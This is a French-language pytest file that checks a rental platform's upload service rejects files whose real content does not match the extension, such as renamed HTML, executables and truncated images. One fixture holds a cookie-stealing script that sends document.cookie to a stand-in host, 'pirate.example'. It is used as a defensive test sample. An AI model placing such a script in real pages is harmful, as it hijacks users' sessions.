"""Type réel des pièces privées contrôlé avant stockage (lot 1.16).

CNI, justificatifs de revenus et pièces de propriété sont stockés tels quels,
sans ré-encodage. L'extension n'étant qu'une déclaration du client, le
contenu doit être un vrai PDF ou une vraie image d'un format accepté : une
page HTML renommée en `.pdf` ne doit jamais atteindre le stockage.
"""
import io
import os

import pytest
from PIL import Image

PDF_MINIMAL = (b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
               b"2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\n"
               b"trailer<</Root 1 0 R>>\n%%EOF\n")
HTML = (b"<!DOCTYPE html><html><body><script>fetch('https://pirate.example/?c='"
        b"+document.cookie)</script></body></html>")


def image(format_, taille=(40, 30), couleur=(30, 140, 90)):
    flux = io.BytesIO()
    Image.new("RGB", taille, couleur).save(flux, format_)
    return flux.getvalue()


def _cni(client, locataire, entetes, octets, nom):
    return client.post("/api/passport/upload/cni_recto", headers=entetes(locataire),
                       data={"file": (io.BytesIO(octets), nom)},
                       content_type="multipart/form-data")


def _pieces_annonce(client, annonce, bailleur, entetes, octets, nom):
    return client.post(f"/api/listings/{annonce.id}/documents", headers=entetes(bailleur),
                       data={"files": [(io.BytesIO(octets), nom)]},
                       content_type="multipart/form-data")


def _fichier_stocke(app, url):
    with open(os.path.join(app.config["UPLOAD_FOLDER"], os.path.basename(url)), "rb") as f:
        return f.read()


def _refus_sans_stockage(reponse, supabase, statut=422):
    assert reponse.status_code == statut
    corps = reponse.get_json()
    assert "ne correspond pas à son type" in corps["error"]
    assert supabase.televersements == []
    return corps


# ─── Contenus refusés ────────────────────────────────────────

FAUX_FICHIERS = [
    pytest.param(HTML, "releve.pdf", id="html-renomme-pdf"),
    pytest.param(b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 200, "titre.pdf", id="exe-renomme-pdf"),
    pytest.param(b"Bonjour, ceci est un simple texte.\n" * 5, "cni.jpg", id="texte-renomme-jpg"),
    pytest.param(b"Bonjour, ceci est un simple texte.\n" * 5, "cni.png", id="texte-renomme-png"),
    pytest.param(image("JPEG")[:300], "cni.jpg", id="jpeg-tronque"),
    pytest.param(image("PNG")[:-30], "cni.png", id="png-tronque"),
    pytest.param(image("WEBP")[:60], "cni.webp", id="webp-tronque"),
]


@pytest.mark.parametrize("octets, nom", FAUX_FICHIERS)
def test_piece_d_identite_dont_le_contenu_trahit_le_type_refusee(
        client, locataire, entetes, supabase, octets, nom):
    reponse = _cni(client, locataire, entetes, octets, nom)

    corps = _refus_sans_stockage(reponse, supabase)
    assert corps["details"] == []
    # Le dossier n'a pas bougé : aucune pièce rattachée, rien à vérifier.
    assert locataire.passport.cni_recto_url is None
    assert locataire.cni_uploaded is False


def test_png_aux_octets_endommages_refuse(client, locataire, entetes, supabase):
    octets = bytearray(image("PNG", taille=(64, 64)))
    octets[60] ^= 0xFF  # dans le bloc IDAT : la somme CRC ne correspond plus

    reponse = _cni(client, locataire, entetes, bytes(octets), "cni.png")

    _refus_sans_stockage(reponse, supabase)


def test_signature_pdf_au_dela_du_premier_kio_refusee(client, locataire, entetes, supabase):
    reponse = _cni(client, locataire, entetes, b" " * 1100 + PDF_MINIMAL, "releve.pdf")

    _refus_sans_stockage(reponse, supabase)


def test_bombe_de_decompression_refusee(client, locataire, entetes, supabase, monkeypatch):
    # Seuil abaissé : une vraie image de plus de 50 Mpx serait lente à fabriquer.
    monkeypatch.setattr(Image, "MAX_IMAGE_PIXELS", 100)

    reponse = _cni(client, locataire, entetes, image("PNG", taille=(20, 20)), "cni.png")

    assert reponse.status_code == 422
    assert "trop grande" in reponse.get_json()["error"]
    assert supabase.televersements == []


def test_format_non_accepte_reste_un_400(client, locataire, entetes, supabase):
    reponse = _cni(client, locataire, entetes, HTML, "releve.html")

    assert reponse.status_code == 400
    assert reponse.get_json()["details"] == []
    assert supabase.televersements == []


# ─── Contenus acceptés, stockés tels quels ───────────────────

@pytest.mark.parametrize("octets, nom, ext", [
    pytest.param(PDF_MINIMAL, "releve.pdf", "pdf", id="pdf"),
    # Octets parasites avant l'en-tête, tolérés par les lecteurs PDF.
    pytest.param(b"\r\n\r\n" + PDF_MINIMAL, "releve.pdf", "pdf", id="pdf-prefixe"),
    pytest.param(image("JPEG"), "cni.jpg", "jpg", id="jpg"),
    pytest.param(image("JPEG"), "cni.jpeg", "jpeg", id="jpeg"),
    pytest.param(image("PNG"), "cni.png", "png", id="png"),
    pytest.param(image("WEBP"), "cni.webp", "webp", id="webp"),
])
def test_vraie_piece_stockee_sans_modification(app, client, locataire, entetes,
                                               octets, nom, ext):
    reponse = _cni(client, locataire, entetes, octets, nom)

    assert reponse.status_code == 200
    url = reponse.get_json()["url"]
    assert url.endswith(f".{ext}")
    # Pas de ré-encodage des pièces privées : les octets reçus sont stockés.
    assert _fichier_stocke(app, url) == octets


def test_png_nomme_jpg_stocke_avec_son_type_reel(client, locataire, entetes, supabase):
    reponse = _cni(client, locataire, entetes, image("PNG"), "cni.jpg")

    assert reponse.status_code == 200
    assert reponse.get_json()["url"].endswith(".png")
    (envoi,) = supabase.televersements
    assert envoi["url"].endswith(".png")
    assert envoi["headers"]["Content-Type"] == "image/png"


def test_pdf_nomme_jpg_stocke_en_pdf(client, locataire, entetes, supabase):
    reponse = _cni(client, locataire, entetes, PDF_MINIMAL, "scan.jpg")

    assert reponse.status_code == 200
    (envoi,) = supabase.televersements
    assert envoi["url"].endswith(".pdf")
    assert envoi["headers"]["Content-Type"] == "application/pdf"


def test_justificatif_de_revenus_controle_aussi(client, locataire, entetes, supabase):
    reponse = client.post("/api/passport/upload/income", headers=entetes(locataire),
                          data={"file": (io.BytesIO(HTML), "bulletin.pdf")},
                          content_type="multipart/form-data")

    _refus_sans_stockage(reponse, supabase)


# ─── Pièces de propriété d'une annonce ───────────────────────

def test_faux_titre_de_propriete_refuse_sans_stockage(client, annonce, bailleur, entetes,
                                                     supabase):
    reponse = _pieces_annonce(client, annonce, bailleur, entetes, HTML, "titre.pdf")

    # La route (couloir L2) renvoie encore 400 pour toute `ErreurStockage` ;
    # le contrôle, lui, vit dans le stockage et s'applique déjà.
    _refus_sans_stockage(reponse, supabase, statut=400)
    assert annonce.documents == []


def test_vrai_titre_de_propriete_accepte(client, annonce, bailleur, entetes, supabase):
    reponse = _pieces_annonce(client, annonce, bailleur, entetes, PDF_MINIMAL, "titre.pdf")

    assert reponse.status_code == 201
    assert annonce.documents[0].startswith("supabase://documents/")
    assert annonce.documents[0].endswith(".pdf")


# ─── Accès inchangés ─────────────────────────────────────────

def test_pieces_de_l_annonce_d_un_autre_toujours_refusees(client, fabrique, annonce, entetes,
                                                         supabase):
    autre = fabrique.bailleur()

    reponse = _pieces_annonce(client, annonce, autre, entetes, PDF_MINIMAL, "titre.pdf")

    assert reponse.status_code == 403
    assert supabase.televersements == []


def test_pieces_d_une_annonce_inexistante(client, bailleur, entetes, supabase):
    reponse = client.post("/api/listings/inexistante/documents", headers=entetes(bailleur),
                          data={"files": [(io.BytesIO(PDF_MINIMAL), "titre.pdf")]},
                          content_type="multipart/form-data")

    assert reponse.status_code == 404
    assert supabase.televersements == []


def test_piece_d_identite_reservee_au_locataire(client, bailleur, entetes, supabase):
    reponse = _cni(client, bailleur, entetes, PDF_MINIMAL, "cni.pdf")

    assert reponse.status_code == 403
    assert supabase.televersements == []
